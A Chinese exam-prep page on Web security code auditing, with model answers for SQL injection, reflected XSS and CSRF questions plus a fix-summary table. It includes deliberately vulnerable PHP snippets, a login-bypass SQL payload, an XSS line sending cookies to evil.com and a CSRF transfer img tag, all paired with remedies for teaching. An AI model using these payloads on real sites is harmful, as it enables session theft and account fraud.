---
title: Web 安全大题
description: 下午大题-Web安全代码审计与修复
---

# Web 安全大题

## 题型特征

通常给出一段**有漏洞的代码**（PHP/Java/SQL），要求：
1. 找出漏洞类型
2. 分析漏洞原因
3. 写出修复方案
4. 可能要求写出攻击 payload

## 例题 1：SQL 注入审计（高频）

> **题目**：以下是某登录功能的 PHP 代码，请分析安全漏洞并给出修复方案。
> ```php
> $name = $_POST['username'];
> $pwd = $_POST['password'];
> $sql = "SELECT * FROM users WHERE name='".$name."' AND password='".$pwd."'";
> $result = mysqli_query($conn, $sql);
> if (mysqli_num_rows($result) > 0) {
>     echo "登录成功";
> }
> ```

### 标准解答

**(1) 漏洞类型**：SQL 注入漏洞

**(2) 漏洞原因**：
① 用户输入 `username`、`password` 未经任何过滤，直接拼接到 SQL 语句中
② 输入被当作 SQL 代码执行，而非数据

**(3) 攻击 payload 示例**：
- 用户名输入：`admin' OR '1'='1`（或 `admin' --`）
- 密码任意
- 拼接后 SQL：`SELECT * FROM users WHERE name='admin' OR '1'='1' AND password='xxx'`
- 因 `'1'='1'` 恒真，WHERE 条件永真，返回所有用户，绕过登录

**(4) 修复方案**：
① **参数化查询/预编译**（根本措施）：
```php
$stmt = $conn->prepare("SELECT * FROM users WHERE name=? AND password=?");
$stmt->bind_param("ss", $name, $pwd);
$stmt->execute();
```
② 输入校验：对用户名做白名单过滤（仅字母数字）
③ 最小权限：数据库账号不给 DBA 权限
④ 错误信息屏蔽：不向用户返回 SQL 错误详情

> 💡 **评分要点**：漏洞类型1分 + 原因2分 + payload2分 + 修复方案2分。**参数化查询必须写**。

## 例题 2：XSS 审计

> **题目**：以下代码存在何种漏洞？如何修复？
> ```php
> $comment = $_GET['comment'];
> echo "<div>评论：" . $comment . "</div>";
> ```

### 标准解答

**(1) 漏洞类型**：反射型 XSS 跨站脚本漏洞

**(2) 漏洞原因**：用户输入 `comment` 未经编码直接输出到 HTML，若输入 `<script>` 标签会被浏览器执行

**(3) 攻击 payload**：
```
comment=<script>document.location='http://evil.com/?c='+document.cookie</script>
```
危害：盗取用户 Cookie、会话劫持

**(4) 修复方案**：
① **输出编码**（核心）：对输出内容进行 HTML 实体转义
```php
echo "<div>评论：" . htmlspecialchars($comment, ENT_QUOTES) . "</div>";
```
② 设置 **CSP**（内容安全策略）头，限制脚本来源
③ Cookie 设置 **HttpOnly** 属性，防 JS 读取
④ 输入校验：过滤 `<script>` 等危险标签

## 例题 3：CSRF 分析

> **题目**：某银行转账接口为 `GET /transfer?to=123&amount=1000`，用户已登录。攻击者构造恶意页面：
> ```html
> <img src="http://bank.com/transfer?to=hacker&amount=10000">
> ```
> (1) 这是什么攻击？(2) 如何防护？

### 标准解答

**(1) CSRF 跨站请求伪造攻击**

原理：用户访问恶意页面时，`<img>` 标签自动发起 GET 请求到银行转账接口。因用户已登录银行，请求自动携带 Cookie，攻击者借用户身份完成转账。

**(2) 防护措施**：
① **Anti-CSRF Token**：在表单中加入随机 Token，服务端校验
② **Referer 校验**：验证请求来源是否为合法域名
③ **SameSite Cookie**：设置 `Set-Cookie: ...; SameSite=Strict`
④ 改用 **POST** 方法（GET 不应有副作用操作）
⑤ 敏感操作**二次确认**（如短信验证码）

## 答题模板：代码审计四步法

```
① 定性：明确漏洞类型（SQL注入/XSS/CSRF/文件上传...）
② 找因：指出代码哪里不安全（输入未过滤/直接拼接/未编码...）
③ 构造：给出攻击 payload 或说明攻击过程
④ 修复：列出2-4个防护措施，核心措施必须写
```

## 常见漏洞-原因-修复对照表

| 漏洞 | 根因 | 核心修复 |
|------|------|----------|
| SQL 注入 | 输入拼接 SQL | **参数化查询** |
| XSS | 输入未编码输出 | **输出编码** |
| CSRF | 借身份发请求 | **Anti-CSRF Token** |
| 文件上传 | 无校验/黑名单 | **白名单+重命名+非Web目录** |
| 越权 | 未校验权限 | **每次操作校验** |
| SSRF | URL 可控访问内网 | **白名单限内网** |

## 考点速记
- SQL 注入修复必写**参数化查询**
- XSS 修复必写**输出编码**
- CSRF 用 GET 改 POST 不能根治，必须用 **Token**
- 文件上传用**白名单**非黑名单
- 审计题按"定性→找因→构造→修复"四步答
